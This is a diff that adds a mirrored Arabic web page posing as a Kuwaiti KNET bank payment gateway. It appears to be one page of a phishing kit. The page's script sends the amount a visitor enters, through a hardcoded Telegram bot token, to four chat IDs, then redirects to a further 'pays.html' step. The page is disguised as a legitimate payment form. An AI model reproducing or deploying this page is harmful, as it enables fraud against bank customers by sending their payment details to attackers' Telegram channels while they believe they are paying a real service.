@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<!-- Mirrored from pay-nbk-alkwat.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 06 Oct 2025 18:02:48 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta property="og:title" content="KNET Payment Gateway" />
+  <meta property="og:image" content="www2.0zz0.com/2025/07/16/08/816277413.png" />
+  <meta property="og:url" content="../external.html?link=https://example.com/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:locale" content="ar_AR" />
+
+  <title>الدفع السريع</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    .container {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 400px;
+      margin: 40px auto 80px;
+      text-align: right;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 8px;
+    }
+
+    .title {
+      text-align: center;
+      color: #00008B;
+      margin-bottom: 20px;
+      font-size: 1.8em;
+    }
+
+    .card {
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 20px;
+      background-color: #f9f9f9;
+    }
+
+    .field {
+      margin-bottom: 15px;
+    }
+
+    .field label {
+      font-weight: bold;
+      color: #555;
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    .field p,
+    .field input {
+      width: 100%;
+      padding: 10px;
+      font-size: 1em;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      background-color: #fff;
+      color: #333;
+    }
+
+    .field p { margin: 0; }
+
+    .instruction {
+      font-size: 0.9em;
+      color: #777;
+      text-align: center;
+      margin-bottom: 25px;
+      line-height: 1.6;
+    }
+
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      font-size: 1.1em;
+      cursor: pointer;
+      margin-bottom: 10px;
+      transition: background-color 0.3s ease;
+    }
+
+    .btn.confirm {
+      background-color: #007bff;
+      color: white;
+    }
+
+    .btn.confirm:hover {
+      background-color: #0056b3;
+    }
+
+    .btn.reject {
+      background-color: #f8f9fa;
+      color: #333;
+      border: 1px solid #ccc;
+    }
+
+    .btn.reject:hover {
+      background-color: #e2e6ea;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">
+      <img src="www2.0zz0.com/2025/07/14/23/609469565.jpg" alt="شعار البنك">
+    </div>
+    <h1 class="title">الدفع السريع</h1>
+
+    <div class="card">
+      <div class="field">
+        <label>اسم المستلم:</label>
+        <p>مكتب خدمات الكويت</p>
+      </div>
+
+      <div class="field">
+        <label for="amount">    المبلغ KWD :</label>
+        <input type="number" id="amount" name="amount" placeholder="أدخل المبلغ بالدينار الكويتي" required min="0.001" step="0.001">
+      </div>
+
+      <div class="field">
+        <label>الغاية:</label>
+        <p>دفع الخدمات</p>
+      </div>
+    </div>
+
+    <p class="instruction">
+      بعد إتمام عملية الدفع، يرجى عدم إغلاق الصفحة قبل ظهور رسالة
+      <strong>تمت المعالجة (Captured)</strong> لتجنب أي إزعاج.
+    </p>
+
+    <button class="btn confirm" id="confirmBtn">تأكيد</button>
+    <button class="btn reject" id="rejectBtn">رفض</button>
+  </div>
+
+<script>
+  document.getElementById("confirmBtn").addEventListener("click", function () {
+    const amountInput = document.getElementById("amount");
+    const amount = amountInput.value.trim();
+
+    if (!amount || parseFloat(amount) <= 0) {
+      alert("يرجى إدخال مبلغ صالح.");
+      amountInput.focus();
+      return;
+    }
+
+    // إظهار رسالة تحميل
+    const confirmBtn = document.getElementById("confirmBtn");
+    const originalText = confirmBtn.textContent;
+    confirmBtn.textContent = "جاري الإرسال...";
+    confirmBtn.disabled = true;
+
+    const token = "8390566501:AAEtgzzcPvoIddsz4SCXhmCGF3QhOH6o0r4";
+    const chat_ids = ["7335192117", "6323300854", "8280462390", "7942066919"];
+    
+    const message = `💳 عملية دفع جديدة:\n\n` +
+                    `👤 اسم المستلم: مكتب خدمات الكويت\n` +
+                    `💰 المبلغ: ${amount} دينار كويتي\n` +
+                    `🎯 الغاية: دفع الخدمات`;
+
+    let sentCount = 0;
+    let errorCount = 0;
+
+    // إرسال الرسالة لكل chat_id في المصفوفة
+    chat_ids.forEach(chat_id => {
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+      
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ 
+          chat_id: chat_id, 
+          text: message,
+          parse_mode: "HTML"
+        })
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        return response.json();
+      })
+      .then(data => {
+        if (data.ok) {
+          sentCount++;
+          console.log(`تم الإرسال إلى ${chat_id} بنجاح`);
+        } else {
+          errorCount++;
+          console.error(`فشل الإرسال إلى ${chat_id}:`, data.description);
+        }
+      })
+      .catch(err => {
+        errorCount++;
+        console.error(`خطأ في الإرسال إلى ${chat_id}:`, err);
+      })
+      .finally(() => {
+        // إذا اكتملت جميع المحاولات
+        if (sentCount + errorCount === chat_ids.length) {
+          // إعادة زر التأكيد إلى حالته الأصلية
+          confirmBtn.textContent = originalText;
+          confirmBtn.disabled = false;
+          
+          if (sentCount > 0) {
+            // الانتقال إلى الصفحة التالية إذا نجح إرسال واحد على الأقل
+            window.location.href = "pays.html"; 
+          } else {
+            alert("فشل إرسال البيانات. يرجى المحاولة مرة أخرى.");
+          }
+        }
+      });
+    });
+  });
+
+  document.getElementById("rejectBtn").addEventListener("click", function () {
+    alert("تم رفض الدفع.");
+  });
+</script>
+</body>
+
+<!-- Mirrored from pay-nbk-alkwat.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 06 Oct 2025 18:02:53 GMT -->
+</html>
